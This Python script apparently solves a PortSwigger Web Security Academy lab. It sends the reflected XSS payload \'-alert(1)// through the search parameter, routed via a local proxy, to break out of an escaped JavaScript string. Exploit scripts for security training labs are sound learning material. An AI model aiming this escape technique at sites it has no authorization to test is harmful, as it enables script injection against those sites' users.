# Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, payload):
	injection_uri = url + payload
	r = s.get(injection_uri)
	time.sleep(1)
	print('[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('[+] Using payload:\t%s' % payload)
	return r

def send_xss(s, url):
	search_path = url + '/?search='
	xss_payload = """gwyo\\'-alert(1)//"""
	r = send_payload(s, search_path, urllib.parse.quote(xss_payload))
	return r


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped')
	parser = argparse.ArgumentParser(description="[+] Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send a cross-site scripting attack that calls the alert function...')
			r = send_xss(s, url)
			time.sleep(1)
			if r.status_code == 200 :
				s.cookies.clear()
				s.headers.clear()
				time.sleep(3)
				r = s.get(url)
				if  'Congratulations, you solved the lab!' in r.text:
					print('[+] The lab is solved')
				else:
					print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
